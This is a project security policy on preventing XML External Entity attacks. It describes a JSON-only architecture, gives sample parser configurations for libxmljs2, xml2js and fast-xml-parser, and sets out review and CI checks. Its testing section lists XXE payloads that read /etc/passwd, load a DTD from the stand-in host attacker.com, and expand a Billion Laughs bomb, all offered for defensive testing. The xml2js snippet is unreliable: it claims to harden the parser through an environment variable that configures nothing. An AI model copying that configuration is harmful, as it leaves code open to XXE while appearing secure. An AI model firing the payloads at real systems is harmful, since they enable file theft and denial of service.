# XXE Prevention Security Policy

## SSD-32: Protection Against XML External Entity (XXE) Attacks

This document outlines the security measures implemented to prevent XML External Entity (XXE) attacks in accordance with SSD-32 compliance requirements.

## Current Implementation Status ✅

### JSON-First Architecture

Our application follows a **JSON-first approach** for all data exchange:

- ✅ All API endpoints accept and return JSON
- ✅ All webhook integrations use JSON (Recall.ai, Google Drive)
- ✅ No XML parsing libraries are installed
- ✅ No XML processing in the application

### Supported File Types

The application processes the following file types for knowledge base documents:

- PDF (`application/pdf`)
- DOCX (`application/vnd.openxmlformats-officedocument.wordprocessingml.document`)
- DOC (`application/msword`)
- TXT (`text/plain`)
- MD (`text/markdown`)

**Note:** While DOCX files are technically ZIP archives containing XML, they are processed using the `mammoth` library which handles the XML parsing securely at a low level without exposing external entity processing.

## Acceptance Criteria Status

- ✅ **DTD processing disabled**: Not applicable - no XML processing
- ✅ **External entities blocked**: Not applicable - no XML processing
- ✅ **Secure parser configuration**: Not applicable - JSON-only architecture

## Future XML Processing Guidelines

**⚠️ IMPORTANT:** If XML processing becomes necessary in the future, the following security measures MUST be implemented:

### 1. Use Secure XML Parsing Libraries

For Node.js/TypeScript environments, use one of these libraries with XXE protection:

#### Option A: libxmljs2 (Recommended)

```typescript
import { parseXml } from 'libxmljs2';

// Secure configuration
const doc = parseXml(xmlString, {
  noent: false,    // Disable entity substitution
  dtdload: false,  // Disable DTD loading
  dtdvalid: false, // Disable DTD validation
  doctype: false   // Disable DOCTYPE declarations
});
```

#### Option B: xml2js with Secure Configuration

```typescript
import xml2js from 'xml2js';

// Secure parser configuration
const parser = new xml2js.Parser({
  // Disable external entity processing
  explicitCharkey: false,
  trim: true,
  // DO NOT use external entity resolution
  strict: true,
  // Custom SAX parser options
  xmlns: false,
  explicitRoot: true,
  // Limit depth to prevent DoS
  maxDepth: 10
});

// IMPORTANT: Configure underlying expat parser
process.env.XML_PARSER_OPTIONS = JSON.stringify({
  noent: false,
  dtdload: false,
  dtdvalid: false
});
```

#### Option C: fast-xml-parser (Secure by Default)

```typescript
import { XMLParser } from 'fast-xml-parser';

// fast-xml-parser is secure by default - it doesn't process external entities
const parser = new XMLParser({
  ignoreAttributes: false,
  parseTagValue: false,
  // Additional security options
  processEntities: false, // Critical: disable entity processing
  allowBooleanAttributes: true
});

const result = parser.parse(xmlString);
```

### 2. XML Security Validation Checklist

Before accepting any PR that introduces XML processing, ensure:

- [ ] External entity processing is explicitly disabled
- [ ] DTD loading is disabled
- [ ] DOCTYPE declarations are rejected or ignored
- [ ] XML size limits are enforced (prevent XML bombs)
- [ ] Input validation is performed before parsing
- [ ] Parser configuration is tested with XXE attack vectors
- [ ] Security review is conducted

### 3. Testing for XXE Vulnerabilities

Test any XML parser implementation with these attack vectors:

```xml
<!-- Test 1: Classic XXE -->
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- Test 2: Parameter Entity XXE -->
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data></data>

<!-- Test 3: Blind XXE -->
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data></data>

<!-- Test 4: XML Bomb (Billion Laughs) -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

**Expected Behavior:** All of these should fail to parse or should not expose sensitive data.

### 4. Code Review Requirements

Any code that introduces XML processing must:

1. Include a security review comment explaining why XML is necessary
2. Document the parser configuration and security measures
3. Include unit tests with XXE attack vectors
4. Be reviewed by a security-aware team member
5. Update this document with the specific implementation details

### 5. Alternative Recommendations

Before introducing XML processing, consider these alternatives:

1. **Convert XML to JSON** at the API boundary using a secure service
2. **Reject XML inputs** and require JSON instead
3. **Use a dedicated XML processing service** with security controls
4. **Implement strict allowlisting** of expected XML structures

## Implementation Locations

If XML processing is added, it should be isolated to:

```
apps/web/src/server/services/xml/
├── xml-parser.service.ts       # Secure XML parsing utilities
├── xml-parser.service.test.ts  # XXE attack vector tests
└── xml-security.config.ts      # Parser security configuration
```

## Compliance Verification

### Automated Checks

Add these checks to CI/CD pipeline:

```bash
# Check for XML parsing libraries
pnpm list | grep -E "(xml2js|libxmljs|fast-xml-parser|xml-parser|sax)"

# If any are found, verify secure configuration
# Scan for dangerous patterns
rg -i "xml|dtd|entity|DOCTYPE" apps/web/src --type ts
```

### Manual Review Checklist

During security audits:

- [ ] Verify no XML parsing libraries are installed (unless documented here)
- [ ] If XML parsing exists, review parser configuration
- [ ] Check test coverage includes XXE attack vectors
- [ ] Verify XML input validation is in place
- [ ] Confirm size limits are enforced

## References

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
- [SSD-32: Bescherming tegen XXE](../../../SSD_REMAINING_USER_STORIES.md#milestone-ssd-32-bescherming-tegen-xxe)

## Document History

| Date       | Version | Changes                              | Author        |
| ---------- | ------- | ------------------------------------ | ------------- |
| 2026-02-01 | 1.0.0   | Initial version - JSON-only policy   | Security Team |

---

**Last Updated:** 2026-02-01  
**Next Review Date:** 2026-08-01  
**Policy Owner:** Security & Compliance Team
